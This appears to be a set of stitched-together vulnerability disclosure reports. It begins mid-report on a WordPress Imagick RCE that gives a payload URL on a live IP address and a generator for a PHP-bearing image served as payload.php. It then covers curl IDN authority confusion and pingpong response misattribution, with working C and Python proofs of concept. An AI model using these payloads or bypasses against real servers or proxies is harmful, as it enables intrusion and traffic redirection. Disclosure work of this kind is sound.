
    ```text
    http://140.245.237.219/payload.jpg
    ```

    The file is approximately 50 MB and contains PHP code inside its image metadata that executes:

    ```php
    phpinfo();
    ```

    as proof of PHP code execution.

11. To generate the crafted image payload locally instead, use the attached generator:

    ```bash
    python3 gen_payload.py
    ```

    Ensure the generated file is served with the following HTTP response headers:

    ```http
    Content-Type: image/jpeg
    Content-Disposition: attachment; filename="payload.php"
    ```

## Impact

Under the validated preconditions, an attacker with a default Author account can achieve persistent remote code execution on the WordPress server.

Successful exploitation creates PHP-executable image derivatives that:

- Persist after the temporary source file is deleted.
- Can be invoked over HTTP without authentication.
- Execute with the privileges of the PHP/web-server user.
- May expose database credentials, authentication salts, private files, and other application secrets.
- Can enable database manipulation, administrator account creation, content compromise, malware persistence, and lateral movement.

The demonstrated RCE requires Imagick, a PHP-served writable temporary directory, PHP execution in the resulting location, and successful exploitation of the race window.

title: IDN decoding inserts authority delimiters and can redirect proxy CONNECT to a different host
vulnerability_information:
IDN decoding can insert authority delimiters: CURLU_PUNYCODE output does not

round-trip and proxy requests carry an ambiguous authority

## Summary

libcurl's IDN decoder accepts a hostname containing U+FF20 FULLWIDTH COMMERCIAL

AT (`＠`). libidn2's TR46 transitional fallback converts it to ASCII `@`.

`Curl_idn_decode()` only checks that the result is non-empty, so the decoded

host can contain characters that the URL parser itself treats as authority

delimiters.

Consequences:

1. `curl_url_get(..., CURLU_PUNYCODE)` returns a URL that reparses to a
    
    different host and userinfo.
    
2. Through an HTTP proxy, curl sends the decoded host in the request target.
    
    A proxy using generic URL/authority parsing sees a different host than the
    
    URL's apparent host.
    
3. The non-tunneling proxy path fails with `CURLE_OUT_OF_MEMORY` because the
    
    decoded host cannot be stored with `CURLUPART_HOST`.
    

This is an internal round-trip inconsistency in libcurl, not merely a

browser-versus-curl disagreement.

## Tested versions

- curl 8.23.0, built with libidn2 2.2.0
- curl master `eb2b201a2` (`8.23.1-DEV`), built with libidn2 2.2.0
- System curl 7.68.0 with libidn2 2.2.0 also emitted the proxy request with
    
    the decoded ASCII `@`
    

## Root cause

- `lib/idn.c:314` `Curl_idn_decode()` only rejects an empty result at
    
    `lib/idn.c:329`.
    
- `lib/peer.c:215` stores the decoded host directly.
- `lib/urlapi.c:1638` concatenates the decoded host into the serialized URL.
- `lib/http_proxy.c:213` builds the CONNECT authority from the decoded host.

The URL parser already has an `invalid_host_char` table at

`lib/urlapi.c:446` that rejects `@`, `/`, `:`, `?`, `#`, `[`, `]`, and other

delimiters. The decoder does not apply that validation to its output.

## Reproduction

The probes are in this directory:

- `idn_url_probe.c`
- `idn_proxy_poc.py`

### URL API round trip

Build `audit/idn_url_probe.c` against libcurl with libidn2 and run it.

The process must call `setlocale(LC_ALL, "")` so libidn2's locale-dependent

`idn2_lookup_ul()` sees UTF-8.

Observed on 8.23.0 and master:

```
set-url: 0 (No error)
host: 0 [trusted.example＠evil.example]
punycode-host: 0 [trusted.example@evil.example]
punycode-host-as-host: 21 (Bad hostname)
punycode-url: 0 [https://trusted.example@evil.example/x]
reparse: 0 (No error)
reparsed-host: [evil.example]
reparsed-user: [trusted.example]
```

### Proxy wire behavior

Run `audit/idn_proxy_poc.py` with an IDN-enabled curl binary.

Observed on 8.23.0 and master:

```
tunnel=True
request-line: CONNECT trusted.example@evil.example:80 HTTP/1.1
Host: trusted.example@evil.example:80
parsed-host: evil.example
parsed-user: trusted.example
```

Python's `urllib.parse.urlsplit()` interprets the absolute-form target as

host `evil.example` with username `trusted.example`, which is the standard

generic-authority interpretation.

Observed on curl 7.68.0, the non-tunneling request is:

```
GET http://trusted.example@evil.example/x HTTP/1.1
Host: trusted.example@evil.example
```

On 8.23.0 and master, the same non-tunneling request currently fails with

`CURLE_OUT_OF_MEMORY` before reaching the proxy.

## Suggested fix

After IDN decoding, validate the result with the same hostname syntax rules

used by the URL parser, at minimum rejecting ASCII `@`, `/`, `:`, `?`, `#`,

`[`, `]`, and `\`. Reject the conversion with `CURLE_URL_MALFORMAT` rather

than returning an invalid host.

Add regression tests that:

- assert `curl_url_get(CURLUPART_URL, CURLU_PUNYCODE)` reparses to the same
    
    scheme, host, port, and userinfo;
    
- cover U+FF20, U+FF0F, U+FF1A, U+FF1B, U+FF1F, U+FF03, U+FF3B, U+FF3D,
    
    and U+FF3C;
    
- exercise both proxy CONNECT and non-tunneling absolute-form requests.

## C PoC

File: `idn_url_probe.c`

```c
#include <curl/curl.h>
#include <locale.h>
#include <stdio.h>

static void free_part(char **p)
{
  if(*p) {
    curl_free(*p);
    *p = NULL;
  }
}

int main(void)
{
  /* U+FF20 FULLWIDTH COMMERCIAL AT, encoded as UTF-8. */
  const char *input = "https://trusted.example\xef\xbc\xa0"
                      "evil.example/x";
  CURLU *u = NULL;
  CURLU *v = NULL;
  CURLU *w = NULL;
  char *host = NULL;
  char *phost = NULL;
  char *purl = NULL;
  char *rhost = NULL;
  char *ruser = NULL;
  CURLUcode rc;

  setlocale(LC_ALL, "");
  curl_global_init(CURL_GLOBAL_DEFAULT);
  u = curl_url();
  v = curl_url();
  w = curl_url();
  if(!u || !v || !w)
    return 2;

  rc = curl_url_set(u, CURLUPART_URL, input, 0);
  printf("set-url: %d (%s)\n", (int)rc, curl_url_strerror(rc));
  if(rc)
    goto out;

  rc = curl_url_get(u, CURLUPART_HOST, &host, 0);
  printf("host: %d [%s]\n", (int)rc, host ? host : "(null)");
  rc = curl_url_get(u, CURLUPART_HOST, &phost, CURLU_PUNYCODE);
  printf("punycode-host: %d [%s]\n", (int)rc, phost ? phost : "(null)");
  if(phost) {
    rc = curl_url_set(w, CURLUPART_HOST, phost, 0);
    printf("punycode-host-as-host: %d (%s)\n",
           (int)rc, curl_url_strerror(rc));
  }
  rc = curl_url_get(u, CURLUPART_URL, &purl, CURLU_PUNYCODE);
  printf("punycode-url: %d [%s]\n", (int)rc, purl ? purl : "(null)");

  if(purl) {
    rc = curl_url_set(v, CURLUPART_URL, purl, 0);
    printf("reparse: %d (%s)\n", (int)rc, curl_url_strerror(rc));
    if(!rc) {
      curl_url_get(v, CURLUPART_HOST, &rhost, 0);
      curl_url_get(v, CURLUPART_USER, &ruser, 0);
      printf("reparsed-host: [%s]\n", rhost ? rhost : "(null)");
      printf("reparsed-user: [%s]\n", ruser ? ruser : "(null)");
    }
  }

out:
  free_part(&host);
  free_part(&phost);
  free_part(&purl);
  free_part(&rhost);
  free_part(&ruser);
  curl_url_cleanup(v);
  curl_url_cleanup(w);
  curl_url_cleanup(u);
  curl_global_cleanup();
  return 0;
}
```

## Python PoC

File: `idn_proxy_poc.py`

```python
#!/usr/bin/env python3
import socket
import subprocess
import sys
import threading
import time
from urllib.parse import urlsplit

def run_one(curl, tunnel):
    result = {}

    def proxy():
        listener = socket.socket()
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind(("127.0.0.1", 0))
        listener.listen(1)
        listener.settimeout(5)
        result["port"] = listener.getsockname()[1]
        try:
            conn, _ = listener.accept()
            conn.settimeout(3)
            data = b""
            while b"\r\n\r\n" not in data:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                data += chunk
            result["request"] = data
            conn.close()
        except Exception as exc:
            result["error"] = repr(exc)
        listener.close()

    thread = threading.Thread(target=proxy)
    thread.daemon = True
    thread.start()
    while "port" not in result and "error" not in result:
        time.sleep(0.01)

    url = "http://trusted.example\uff20evil.example/x"
    cmd = [curl, "-sS", "-m", "2", "-x",
           "http://127.0.0.1:%d" % result["port"]]
    if tunnel:
        cmd.append("--proxytunnel")
    cmd.append(url)
    proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    thread.join(timeout=2)

    request = result.get("request", b"")
    first = request.split(b"\r\n")[0].decode("utf-8", "replace")
    print("tunnel=%s rc=%d" % (tunnel, proc.returncode))
    print("request-line: %s" % first)
    if tunnel and first.startswith("CONNECT "):
        parsed = urlsplit("//" + first.split(" ", 2)[1])
    elif not tunnel and first.startswith("GET "):
        parsed = urlsplit(first.split(" ", 2)[1])
    else:
        parsed = None
    if parsed:
        print("parsed-host: %s" % parsed.hostname)
        print("parsed-user: %s" % parsed.username)
    print()

def main():
    curl = sys.argv[1] if len(sys.argv) > 1 else "./build-asan/src/curl"
    print("curl=%s\n" % curl)
    run_one(curl, True)
    run_one(curl, False)

if __name__ == "__main__":
    main()
```

## Reproduction commands

Build the C probe against an IDN-enabled libcurl build, then run:

```bash
./audit/idn_url_probe_master
ASAN_OPTIONS=detect_leaks=0 python3 audit/idn_proxy_poc.py ./curl-master-as/src/curl
```

Observed URL API result:

```
host: trusted.example＠evil.example
punycode-host: trusted.example@evil.example
punycode-host-as-host: 21 (Bad hostname)
punycode-url: https://trusted.example@evil.example/x
reparsed-host: evil.example
reparsed-user: trusted.example
```

Observed proxy request:

```
CONNECT trusted.example@127.0.0.1:8080 HTTP/1.1
Host: trusted.example@127.0.0.1:8080
```

tinyproxy 1.10 `extract_url()` calls `strip_username_password()`, which removes everything through the first `@`, so tinyproxy connects to `127.0.0.1:8080`.

## Impact

## Impact

- A host allowlist, redirect filter, URL cache, or SSRF check using
    
    `CURLU_PUNYCODE` as the canonical form can be bypassed because the output
    
    reparses to a different origin.
    
- In proxy environments, a proxy that accepts userinfo in an absolute-form
    
    request or CONNECT authority can be induced to connect to the attacker's
    
    host while the user-visible URL appears to start with `trusted.example`.
    
- The non-tunneling path returns `CURLE_OUT_OF_MEMORY`, which is a
    
    request-level availability failure.
    

The impact requires an application that accepts the URL and a proxy that

parses the resulting authority permissively. That dependency is why this

should be rated Medium rather than High.

The application cannot reasonably reject the dangerous input by inspecting

the raw hostname: `curl_url_set()` accepts it, and the ASCII `@` only appears

after libcurl's own IDN conversion. The breakage is in libcurl's normalized

output, not in a separate browser parser.

## Why this is not a duplicate of older IDN advisories

- CVE-2016-8625 covered IDNA 2003 versus IDNA 2008 selecting a different
    
    valid hostname.
    
- CVE-2022-42916 covered an HSTS bypass using IDN characters that map to an
    
    ASCII dot.
    
- This report covers the decoder producing authority delimiters that make
    
    libcurl's own `CURLU_PUNYCODE` output non-round-trippable and make proxy
    
    requests ambiguous. The older HSTS-specific check does not cover this path.
    

The precedent for accepting this class is CVE-2022-42916, which was rated

Medium for an IDN character mapping to an ASCII authority separator. This

report has the same class of normalization mismatch plus a direct proxy

request impact.

title: A server response that answers nothing is used as the next transfer's reply — and with IMAP, a fully compliant server does this by accident
vulnerability_information:
**Name:** Maturi Jaswanth Sai Madhu Mohan

**Product:** curl / libcurl — **all four pingpong protocols demonstrated: IMAP, POP3, SMTP and FTP**
— the same protocol set curl's own CVE-2026-92387 names

**Affected:** reproduced on current git master **`dbb8262a9c`** (8.23.1-DEV, fetched and rebuilt
today), on `d1d4b5931a`, on local `8.23.0-DEV` and `8.22.0-DEV` builds, and on the distro
**`curl 8.21.0`** binary in `/usr/bin/curl`. The mechanism predates all of them.

**Class:** response misattribution across transfers on a reused connection. In the FTP variant it
also steers where curl opens the next **outbound data connection**.

**Severity:** I suggest **Low**, and would understand Medium on the strength of the IMAP leg, which
needs no attacker at all — just a server behaving normally while a client fetches two messages.
Nothing here is memory unsafety and no credential is leaked.


## The one-sentence version

When a pingpong server sends a line that no command asked for, curl keeps it in the connection's
receive buffer and answers the **next** command with it. Demonstrated on all four protocols —
**IMAP, POP3, SMTP and FTP** — the same set curl's own CVE-2026-92387 names. Depending on the
protocol the next transfer gets the wrong content with exit 0 (POP3, IMAP with a body), fails on a
reply that belongs to another command (IMAP, SMTP), or opens its data connection where a stray line
pointed (FTP). It survives curl's own connection-reuse check because that check polls the socket
once, at reuse time.


## Why this is in scope, and not a severity opinion

On 2026-10-15 curl merged **`ef6b17cf12` "conncache: poll an idle connection for pending input on
every reuse"** (Bug: hackerone **4098761**, Closes #23412). Its message states the policy in curl's
own words:

> An idle HTTP/1.1 connection that had received unsolicited data from the server was then reused
> within that second and **the stray bytes came back as the response to the next request, so every
> later response on that connection was shifted by one.** […]
> **RFC 9112 section 9.2 says a client must not treat data received with no outstanding request as a
> response**, so poll for pending input on every reuse of an idle non-multiplexed connection […]

This report is the same consequence, on the pingpong protocols, **with that commit present**. The
poll is a single snapshot of the socket at the moment reuse is decided. It cannot cover the case
where the server pushes its unrequested reply a moment later — which is exactly what a server that
wants to desynchronise a reused connection would do. The remaining gap is not the poll's timing, it
is that the pingpong parser has no notion of *which command a reply answers*: whatever is next in
the buffer becomes the response.

### Each ingredient of this bug already has a CVE

| precedent | what curl treated as a vulnerability | where it lands here |
|---|---|---|
| **CVE-2026-92387** — advisory 2026-10-14, *"never-ending loop via server response omission"*, affected 8.10.0–8.22.0, severity **Low** | "By permanently omitting the final control-response line, a malicious **FTP, IMAP, POP3, or SMTP** server can exploit libcurl and completely bypass its configured transfer timeout mechanism"; its recommendation C is "Avoid using the ping-pong protocols" | the threat model is accepted: a server on exactly these four protocols, exploiting how its responses are framed — and graded Low. This report covers the same four protocols and the same framing weakness, with the addition that the IMAP trigger needs no malice |
| **CVE-2020-8284** — *"trusting FTP PASV responses"* | curl connecting wherever a `227` line told it to; mitigated by `--ftp-skip-pasv-ip`, on by default | the same trust, reached differently: this `227` answers **nothing**. The default mitigation still holds the address and lets the port move; with `--no-ftp-skip-pasv-ip` both move |
| **CVE-2026-86411** — *"FTP connection reuse inherits client-certificate"*; **CVE-2023-27535** — *"FTP too eager connection reuse"* | per-connection state from one transfer affecting a later transfer that reused the connection | the same shape, except the inherited state is the pingpong receive buffer instead of a credential |
| **hackerone 4098761 → `ef6b17cf12`** (2026-10-15) | "the stray bytes came back as the response to the next request, so every later response on that connection was shifted by one" | the identical consequence, on the protocols whose buffered leftovers that commit's socket poll cannot see |

I am not asking for a higher band than curl gives this family: CVE-2026-92387 is Low and so is my
suggestion. The difference is the outcome — theirs is a hang, mine is wrong content delivered with
exit code 0, and an outbound data connection to a port the server picked in a line that answered
nothing.


## Summary

One curl invocation, two transfers, one connection. The server sends one line that no command asked
for. curl takes it as the answer to the second transfer's command:

1. **IMAP — a compliant server does this on its own, no attacker.** Untagged responses are legal at
   any moment in RFC 3501, and servers really send them when a phone marks mail read. One such line
   landing between two fetches makes the **second fetch fail with exit 8** (`Failed to parse FETCH
   response`), and if the untagged response carries a body, that body is written out as the next
   message's content with **exit 0**.
2. **POP3 — content substitution, reported as success.** `message 2` written to disk is
   attacker-chosen text. The honest reply to `RETR 2` is displaced and becomes the new leftover, so
   everything after it is shifted by one — the wording of `ef6b17cf12`'s own bug report. Exit code
   0, no warning.
3. **SMTP — the next submission is lost.** The stray `250` is taken as the reply to the next
   `MAIL FROM`, every following reply slides by one, `DATA` is answered with a `250` where `354` is
   required, and the submission fails with exit 55. Stated precisely because it matters: curl does
   **not** report a false success here — the damage is a lost mail, not a silent one.
4. **FTP — the next data connection goes where the stray line points.** The unrequested reply is
   `227 Entering Passive Mode (…)` naming a port. Transfer 2 opens its data connection there and
   the honest `227` for that same `PASV` goes unused. With default options the *port* is attacker-
   chosen and the address stays curl's own; with `--no-ftp-skip-pasv-ip` the line chooses the
   **address too**.

## Evidence 1 — IMAP, with a server doing nothing unusual

Two messages, one command line, one connection. Between the two fetches the server sends

```
* 2 FETCH (UID 2 FLAGS (\Seen))
```

which is what any IMAP server does when another client marks a message read — RFC 3501 permits
untagged responses at any time. curl then asks for message 2 and reads that leftover as its reply:

```
  > A004 FETCH 1 BODY[]
  < * 1 FETCH (UID 1 BODY[] {20}          HONEST-BODY-OF-MSG-1
  < A004 OK FETCH completed
  < * 2 FETCH (UID 2 FLAGS (\Seen))        <- untagged, nothing outstanding
  > A005 FETCH 2 BODY[]
  < * 2 FETCH (UID 2 FLAGS (\Seen))        <- curl parses THIS as A005's answer
  * Failed to parse FETCH response.
  exit=8   m1='HONEST-BODY-OF-MSG-1'   m2=<no file>
```

The honest `* 2 FETCH (UID 2 BODY[] …)` that the server did send never reaches the application.

Same shape, with a body in the untagged response, and it is **silent**:

```
curl exit code        : 0
message 1 received    : HONEST-BODY-OF-MSG-1
message 2 received    : OTHER-SESSION-CONTENT-XY   (the server's honest answer was HONEST-BODY-OF-MSG-2)
```

**Control** — identical two-fetch command, no untagged line: both messages honest, exit 0, one
connection. (A body-bearing untagged `FETCH` is less common unsolicited than a `FLAGS` one; the
`FLAGS` case is the one that needs nothing unusual from the server at all, and it is the one that
fails the transfer.)

I also checked the six untagged forms a server really uses — `* N EXISTS`, `* N EXPUNGE`,
`* BYE`, `* STATUS`, `* N FETCH (FLAGS …)`, `* N FETCH (BODY[] …)` — inserted **during** a transfer
as well as **between** transfers. During a transfer curl handles every one of them correctly; only
the between-commands case mis-attributes them. That is consistent with the leftover being replayed
by the connection-level buffer rather than by IMAP's own parser.

## Evidence 2 — POP3 (all three scenarios come from one run of `poc.py`)

**1/3 — the bug.** Server pushes one multi-line reply 30 ms after finishing message 1, with nothing
outstanding. curl then starts transfer 2 on the reused connection.

```
  0.442s CURL   -> SERVER  RETR 1
  0.442s SERVER -> CURL    +OK 1 octets / HONEST-MESSAGE-ONE / .   (answer to RETR 1)
  0.472s SERVER -> CURL    +OK 1 octets / ATTACKER-INJECTED-CONTENT / .   <<< UNSOLICITED, NOTHING OUTSTANDING
  0.472s CURL   -> SERVER  RETR 2
  0.472s SERVER -> CURL    +OK 1 octets / HONEST-MESSAGE-TWO / .   (honest answer to RETR 2)

curl exit code        : 0
TCP connections used  : 1
message 1 received    : HONEST-MESSAGE-ONE
message 2 received    : ATTACKER-INJECTED-CONTENT   (server's honest answer was HONEST-MESSAGE-TWO)
VERDICT               : BUG REPRODUCED - attacker text delivered as message 2, exit code 0, on the
                        reused connection
```

The honest reply **was** sent and the application never saw it.

**2/3 — the control that makes the mechanism clear.** Identical server, but transfer 2 is made to
start ~3 s later (`--rate 1/3s`), so curl's reuse check now runs *after* the stray bytes have
arrived. curl refuses the connection and opens a fresh one, and message 2 is honest:

```
curl exit code        : 0
TCP connections used  : 2   (the connection was NOT reused)
message 2 received    : HONEST-MESSAGE-TWO
```

So `ef6b17cf12` is working as designed and I am not claiming it is broken. What this pair shows is
that a check at reuse time cannot protect a transfer whose *response* is what the stray data gets
confused with. The server decides the timing; a server that pushes the line after curl's check
still gets it delivered as the next response.

**3/3 — A/B control.** Same script, unsolicited reply switched off: honest message 2, exit 0, one
connection. The only difference between 1/3 and 3/3 is that one reply.

## Evidence 3 — SMTP: the next submission is lost

The server pushes `250 STRAY-QUEUED-NOTHING-OUTSTANDING` right after honestly accepting message 1.
Transfer 2 then submits on the reused connection, and the server answers every one of its commands
correctly:

```
  > MAIL FROM:<sender@example.invalid>          (submission 2)
  < 250 STRAY-QUEUED-NOTHING-OUTSTANDING        <- the stray, not a reply to this
  > RCPT TO:<rcpt1@example.invalid>
  < 250 2.1.0 Sender ok                         <- the reply that belongs to MAIL FROM
  > RCPT TO:<rcpt2@example.invalid>
  < 250 2.1.5 Recipient ok                      <- the reply to the RCPT before it
  > DATA
  < 250 2.1.5 Recipient ok                      <- a 250 where 354 is required
  curl exit code : 55   messages the server actually accepted: 1 of 2
```

Everything is shifted by one, so the second submission dies on a `250` that was the answer to
`RCPT TO`. **Control** (same two submissions, no stray line): both accepted, exit 0.

I am deliberately not dressing this up: curl reports failure rather than a false success, so what
the stray line costs here is a mail that never got sent, not a phantom confirmation.

## Evidence 4 — FTP (default options, then `--no-ftp-skip-pasv-ip`, then control)

Port 54127 is the honest passive port, 55967 is the one named by the unrequested line. The attacker
listener is bound **only** on 55967, so an accepted connection there cannot have come from anything
else. Verbatim from the run:

```
  5.477s CURL   -> SERVER  PASV
  5.477s SERVER -> CURL    227 Entering Passive Mode (127,0,0,1,211,111).   (honest answer to PASV #1)
  5.477s SERVER -> CURL    *** HONEST data listener on 127.0.0.1:54127 ACCEPTED a connection from 127.0.0.1:48798 ***
  5.548s SERVER -> CURL    227 Entering Passive Mode (127,0,0,1,218,159).   <<< UNSOLICITED - NO COMMAND OUTSTANDING
  5.628s CURL   -> SERVER  PASV
  5.628s SERVER -> CURL    227 Entering Passive Mode (127,0,0,1,211,111).   (honest answer to PASV #2)
  5.628s SERVER -> CURL    *** ATTACKER data listener on 127.0.0.1:55967 ACCEPTED a connection from 127.0.0.1:35910 ***
  (curl's own -v output for the same two transfers)
  5.630s   curl          < 227 Entering Passive Mode (127,0,0,1,211,111).
  5.630s   curl          * Connecting to 127.0.0.1 port 54127
  5.630s   curl          > PASV
  5.630s   curl          < 227 Entering Passive Mode (127,0,0,1,218,159).
  5.630s   curl          * Connecting to 127.0.0.1 port 55967
```

`218,159` is 55967 — the port from the line that answered nothing, and curl's own verbose output
shows it connecting there for transfer 2 while the honest `227` for that `PASV` (54127) is consumed
by the *following* command.

With `--no-ftp-skip-pasv-ip`, the same single line moves the **address** as well; the listener is
bound on 127.0.0.2 only:

```
  ==> UNSOLICITED 227 -> 127.0.0.2:<attacker port> (NO COMMAND OUTSTANDING)
  *** EVILIP listener ACCEPTED data connection 127.0.0.2:<attacker port> ***
```

**Control** (identical setup, unsolicited line switched off): both transfers use the honest port,
both files contain `HONEST-DATA`, exit code 0.

Bounding the impact honestly: in the FTP case the transfer then fails (`rc=19`, one file short), so
what I can show is an outbound connection to an attacker-chosen port/address and a lost or
substituted file — not a silent success. The POP3 case is the silent one.

## Root cause: two paths, and they need different fixes

`lib/pingpong.c` keeps one receive buffer **per connection**, and it deliberately retains the bytes
that follow a response's final line:

* `lib/pingpong.c:308-316` — at end of response the final line is kept for the outer parser and
  `pp->overflow` is set to the byte count after it (`:314`);
* `lib/pingpong.c:246-252` — on the next call the retained remainder is replayed (`:251`);
* `lib/pop3.c:1242-1264` — POP3's loop says *"keep only the overflow"* (`:1247`) and keeps those
  bytes for the next command; FTP does the same at `lib/ftp.c:480`, `:500`, `:3209`.

That state is attached to the connection, not the easy handle —
`pop3_setup_connection()` uses `Curl_conn_meta_set(conn, CURL_META_POP3_CONN, pop3c,
pop3_conn_dtor)` (`lib/pop3.c:1687`) and it is freed only when the connection dies. So a second
easy handle reusing the connection inherits the buffer.

The reuse decision cannot see any of that. `Curl_cpool_conn_seems_healthy()` computes `poll_input`
(`lib/conncache.c:1056`) and calls `Curl_conn_is_alive()`, whose socket filter ends at
`lib/cf-socket.c:1829` — `r = Curl_poll(pfd, 1, 0);`. `Curl_conn_data_pending()` exists and is what
would expose buffered input, but it is never consulted in the reuse path.

I separated the two ways a stray line ends up answering the wrong command, by patching and
re-running:

**Path A — the stray was already read into curl's buffer before the transfer ended.** Proven by
patching: adding a `Curl_pp_reset_recv()` call to `pop3_done()`, `imap_done()`, `smtp_done()` and
`ftp_done()` (drop `pp->recvbuf`, `nfinal`, `overflow` when a transfer finishes) **fixes the FTP
leg** — both FTP scenarios go from `data connections accepted: HONEST, ATTACKER` to
`HONEST, HONEST` with exit 0, and the FTP control scenario is unaffected. The patch is attached as
`pingpong-reset-recv-at-transfer-end.patch`; it is 49 added lines and builds warning-free.

**Path B — the stray arrives *after* the reuse poll and after the previous transfer ended.** This is
what the POP3, IMAP and SMTP scenarios do, and it is why they still reproduce with path A closed:
the bytes were never in curl's buffer at transfer-end, they were in flight. No snapshot check can
catch them. The only real defence is per-command correlation:

* **IMAP has it and does not use it here.** `imap_endofresp()` (`lib/imap.c`) correctly separates
  tagged replies (matched against `imapc->resptag`) from untagged ones. The damage is done one step
  later: an untagged `FETCH` that does not match what the command asked for is fed into the FETCH
  parser and **fails the command** (`Failed to parse FETCH response`, exit 8) instead of being
  treated as the information it is while curl keeps waiting for its tagged reply. That is a
  protocol-level fix in IMAP's own state machine, and it is the one I would attempt first.
* **POP3 and SMTP have nothing to correlate with** — a bare `+OK`/`250` carries no request
  identifier. For those two, a client genuinely cannot tell an early reply from an unsolicited one
  over TCP. I am not going to pretend the patch above fixes them, and I would rather hear how the
  maintainers want to handle that than invent a framing scheme.

## Steps to reproduce

Needs only `python3` (stdlib) and a curl with IMAP + POP3 + SMTP + FTP support (standard builds).
Localhost, no root, no external host, ~25 seconds.

```
cd report-a-pingpong-reuse-bypass
CURL=/path/to/curl python3 poc.py            # all eleven scenarios + verdicts
CURL=/path/to/curl python3 poc.py imap       # the IMAP three - compliant server
CURL=/path/to/curl python3 poc.py smtp       # the SMTP pair
CURL=/path/to/curl python3 poc.py pop3       # the POP3 three
CURL=/path/to/curl python3 poc.py ftp        # the FTP three
```

`poc.py` prints both sides of the conversation with timestamps, picks free ports by itself, and
ends with a `BUG REPRODUCED` / `control behaves correctly` verdict per scenario. Retrieved files are
left in a temp directory whose path it prints.

Manual equivalent of the POP3 case, if you would rather drive it yourself — the important part is
**two URLs in one command line**, which is what forces the reuse:

```
curl -v -u u:p -o msg1.txt pop3://<server>/1 -o msg2.txt pop3://<server>/2
```

against a server that, immediately after completing message 1's `. CRLF`, sends

```
+OK 1 octets\r\nATTACKER-INJECTED-CONTENT\r\n.\r\n
```

Separate curl invocations do **not** reproduce it (each process has its own connection); I made
that mistake first, which is why it is written down.

## Suggested fix

Reading the "Root cause" section above first, because the honest answer is that one patch does not
cover it:

1. **IMAP**: an untagged response must never be able to fail the command that happens to be
   outstanding. Handle it as information and keep waiting for the tagged reply. This is the one
   that needs no attacker and is entirely within curl's reach — IMAP already parses tags
   correctly, so this is about what the FETCH state machine does with a line it has already
   identified as untagged.
2. **All four**: drop the pingpong receive cache when a transfer ends, so bytes retained from the
   previous transfer cannot be replayed into the next one. I have this working (`49` lines,
   `pingpong-reset-recv-at-transfer-end.patch`); it verifiably fixes the FTP leg. Offered as a
   starting point, not as the answer to path B.
3. **POP3 / SMTP**: since these cannot be correlated client-side, the conservative option is to
   refuse reuse of a pooled pingpong connection whose buffer was non-empty at transfer end (curl
   already knows: `pp->overflow` / `Curl_pp_moredata()`), which turns path A into a fresh
   connection instead of a shifted response.
4. **FTP additionally**: only accept a `227`/`229` as data-connection information if a
   `PASV`/`EPSV` was actually outstanding when it was read.

I would rather send the version the maintainers would accept, so I am holding the patch until I
hear which of these directions they want — and I am happy to be told the framing belongs in the
protocol modules rather than in `lib/pingpong.c`.


** What is in this submission**

REPORT.md    this file
poc.py       the whole PoC - eleven scenarios, prints both sides of every conversation live
proof.png    one page: the five results with their controls, rendered from the PoC output
```

`python3 poc.py` needs only stdlib python3 and a curl with IMAP / POP3 / SMTP / FTP support. It binds
127.0.0.1 only, picks its own free ports and takes about 25 seconds. Everything in this report's
excerpts — including each server's own log of what it sent and when — is printed as it happens, so
the transcript can be regenerated rather than taken on trust.

The patch mentioned under "Suggested fix" is deliberately not attached: it is my own verification
tool, it fixes only path A, and attaching a partial fix to a security report helps nobody. Say the
word and I will send it or open a PR against whichever direction the maintainers prefer.

```

## Impact

Headline — the one sentence that carries it:
   │ What curl writes to your output file, and whether it tells you the transfer succeeded, is supposed to be determined by the server's   answer to the request curl actually made. On all four pingpong protocols a line the server sent while nothing was outstanding becomes the answer to the next command — so curl reports the wrong bytes as the right ones, or fails a command the server had already answered
correctly.

   Per leg (demonstrated → consequence → who can trigger it):
   - IMAP — an ordinary untagged * N FETCH (FLAGS …) between two fetches makes the second fetch fail (exit 8, file never written); an
   untagged FETCH carrying a body writes those bytes into the next message's file with exit 0. → No attacker needed. Any compliant server
   pushing a normal change notification while a phone/desktop touches the same mailbox. This is the leg to lead with.
   - POP3 — attacker-chosen text delivered as message 2, honest reply displaced, everything after shifted by one, exit 0. → Mail content
   the mailbox never stored reaches the app as a real message with a success code; anything downstream (storage, filters, scanners,
   display) trusts attacker-chosen text.
   - SMTP — stray 250 shifts replies until DATA gets a 250 instead of 354; submission lost, exit 55, server accepted 1 of 2. → I state
   explicitly that curl does not report a false success here, because that was the first thing I looked for and it isn't true.
   - FTP — transfer 2's data connection opened on the port named by a 227 that answered no PASV (address too with --no-ftp-skip-pasv-ip);
   transfer then fails exit 19. → An outbound connection whose destination is taken from a non-reply, plus a lost download.

title: Pinned public key check passes for a key the server does not hold with the wolfSSL backend
passive FTPS data connection handshake blocks curl_multi_perform() with no timeout (regression in 8.19.0)
vulnerability_information:
## Summary:
On a passive FTPS transfer libcurl runs the TLS handshake of the data connection inside a blocking Curl_conn_connect() call after the server's 150 (lib/ftp.c line 550 in curl-8_23_0, ftp_initiate_transfer()), and that blocking loop (lib/connect.c line 334) bounds itself with Curl_timeleft_ms(data), which since 8ce16e7bf2 (first shipped in 8.19.0) returns "no limit" for anything at or past MSTATE_DO unless the application set CURLOPT_TIMEOUT. So a server that answers 150 and never completes the handshake on the data connection keeps curl_multi_perform() from returning at all, CURLOPT_CONNECTTIMEOUT, CURLOPT_SERVER_RESPONSE_TIMEOUT and the low speed limit never get to fire, and every other transfer on that multi handle is stuck with it. Before that commit the loop called Curl_timeleft_ms(data, TRUE) and the connect timeout (or its 300 s default) always bounded the wait, which 8.18.0 still does. Reproduced with the attached local server (implicit FTPS, normal replies, 150 then hold the passive data socket without a handshake): on curl-8_23_0, curl --connect-timeout 2 --cacert cert.pem ftps://127.0.0.1:8322/file runs until killed (20 s and 90 s wrappers, the 150 is the last line of --trace-time output) and -m 5 ends it with "curl: (28) connect timeout" at 5.0 s, which is the failf inside that same loop, while curl-8_18_0 fails with that error at 2.0 s. With the attached multi program (the ftps transfer plus a plain http transfer with a 3 s server delay, added one second in) 8.18.0 completes both with the longest curl_multi_perform() call at 0.45 s, 8.23.0 never returns from the call that entered the handshake and the http transfer never finishes, and a plain FTP server doing the same thing is the control and keeps the loop turning. The attached 18 line patch applies the connect timeout to a blocking wait that happens past the connect phase, measured from the start of that wait and taking the smaller of it and the total timeout, which makes 8.23.0 behave like 8.18.0 again with the test suite unchanged; AI tooling  helped with the fixture scripts along with this report draft, the reproduction and the numbers are mine.

## Affected version
